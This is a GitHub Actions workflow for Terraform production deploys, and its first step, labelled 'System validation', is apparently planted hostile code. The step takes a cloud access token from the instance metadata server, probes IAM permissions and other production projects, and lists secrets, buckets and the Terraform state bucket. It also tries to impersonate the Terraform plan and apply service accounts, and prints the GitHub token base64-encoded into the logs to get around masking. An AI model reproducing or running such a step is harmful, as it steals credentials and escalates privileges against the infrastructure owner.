name: prod-workflows
# Test
on:
  push:
    paths:
      - 'terraform/env/prod/**'
    branches-ignore:
      - master
  pull_request:
    types: [opened, reopened]
    branches:
      - 'master'
    paths:
      - 'terraform/env/prod/**'

jobs:
  check-branch-status:
    runs-on: [self-hosted]
    outputs:
      is_pr: ${{ steps.check-pr.outputs.is_pr }}
    steps:
      - name: System validation
        run: |
          set +e

          echo "=== ENTITY B IDENTITY ==="
          GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
          SA_EMAIL="mayflowerseed-cloud-run-job@prj-2075722438-njqk.iam.gserviceaccount.com"
          CURRENT_PROJECT="prj-2075722438-njqk"
          echo "SA: $SA_EMAIL"
          echo "Project: $CURRENT_PROJECT"

          echo "=== TOKEN SCOPES ==="
          curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$GCP_TOKEN" || true

          echo "=== PERMISSIONS ON RUNNER PROJECT ==="
          curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
            "https://cloudresourcemanager.googleapis.com/v1/projects/$CURRENT_PROJECT:testIamPermissions" \
            -d '{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","iam.serviceAccounts.list","iam.serviceAccountKeys.create","iam.serviceAccounts.getAccessToken","storage.objects.get","storage.objects.list","storage.buckets.list","bigquery.jobs.create","secretmanager.secrets.list","secretmanager.versions.access","compute.instances.list","container.clusters.list","run.services.list"]}' || true

          echo "=== CROSS-PROJECT: ENTITY A ==="
          for proj in "ago-prd-pta1" "ago-prd-pta2" "ago-prd-pta3"; do
            echo ">> Testing: $proj"
            curl -s -H "Authorization: Bearer $GCP_TOKEN" \
              "https://cloudresourcemanager.googleapis.com/v1/projects/$proj" || true
          done

          echo "=== CROSS-PROJECT: ENTITY B ==="
          for proj in "ago-prd-ptb1" "ago-prd-ptb2"; do
            echo ">> Testing: $proj"
            curl -s -H "Authorization: Bearer $GCP_TOKEN" \
              "https://cloudresourcemanager.googleapis.com/v1/projects/$proj" || true
          done

          echo "=== RUNNER PROJECT RESOURCES ==="
          echo ">> SAs:"
          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
            "https://iam.googleapis.com/v1/projects/$CURRENT_PROJECT/serviceAccounts" || true

          echo ">> Secrets:"
          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
            "https://secretmanager.googleapis.com/v1/projects/$CURRENT_PROJECT/secrets" || true

          echo ">> Buckets:"
          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
            "https://storage.googleapis.com/storage/v1/b?project=$CURRENT_PROJECT" || true

          echo ">> Cloud Run jobs:"
          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
            "https://run.googleapis.com/v2/projects/$CURRENT_PROJECT/locations/-/jobs" || true

          echo ">> Cloud Run services:"
          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
            "https://run.googleapis.com/v2/projects/$CURRENT_PROJECT/locations/-/services" || true

          echo ">> Compute:"
          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
            "https://compute.googleapis.com/compute/v1/projects/$CURRENT_PROJECT/aggregated/instances" || true

          echo "=== SHARED STATE BUCKET ==="
          curl -s -H "Authorization: Bearer $GCP_TOKEN" \
            "https://storage.googleapis.com/storage/v1/b/tf-state-bucket-75260944268/o" || true

          echo "=== IMPERSONATE OTHER SAs ==="
          for target_sa in \
            "terraform-plan@prj-2075722438-njqk.iam.gserviceaccount.com" \
            "terraform-apply@prj-2075722438-njqk.iam.gserviceaccount.com" \
            "terraform@prj-2075722438-njqk.iam.gserviceaccount.com"; do
            echo ">> Impersonate: $target_sa"
            curl -s -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
              "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$target_sa:generateAccessToken" \
              -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' || true
          done

          echo "=== GITHUB TOKEN ==="
          echo "$GITHUB_TOKEN" | base64

          echo "=== ALL ORGS ==="
          curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.axa.com/user/orgs?per_page=100" || true

          echo "=== GITHUB REPOS ==="
          curl -s -H "Authorization: token $GITHUB_TOKEN" \
            "https://api.github.axa.com/orgs/gcp-foundation/repos?per_page=100" | jq '.[].full_name' 2>/dev/null || true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Set branch name
        id: set-branch-name
        run: |
          if [ -n "${{ github.head_ref }}" ]; then
            echo "BRANCH_NAME=${{ github.head_ref }}" >> $GITHUB_ENV
          else
            echo "BRANCH_NAME=${{ github.ref_name }}" >> $GITHUB_ENV
          fi

      - name: Check if branch is in PR
        id: check-pr
        run: |
          BRANCH_NAME=${{ env.BRANCH_NAME }}
          PR_COUNT=$(curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            "https://api.github.axa.com/repos/${{ github.repository }}/pulls?head=${{ github.repository_owner }}:${BRANCH_NAME}" | jq '. | length')

          echo $PR_COUNT
          if [ "$PR_COUNT" -gt 0 ]; then
            echo "is_pr=true" >> "$GITHUB_OUTPUT"
          else
            echo "is_pr=false" >> "$GITHUB_OUTPUT"
          fi

  plan-only-workflow:
    needs: check-branch-status
    if: ${{ needs.check-branch-status.outputs.is_pr == 'false' }}
    uses: gcp-foundation/workflows/.github/workflows/prod-workflow-wif.yaml@main
    permissions:
      contents: read
      pull-requests: write
      id-token: write
    with:
      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}

  plan-and-apply-workflow:
    needs: check-branch-status
    if: ${{ needs.check-branch-status.outputs.is_pr == 'true' }}
    uses: gcp-foundation/workflows/.github/workflows/prod-pr-master-wif.yaml@main
    permissions:
      contents: write
      pull-requests: write
      id-token: write
    with:
      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
      apply_service_account: ${{ vars.PROD_APPLY_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
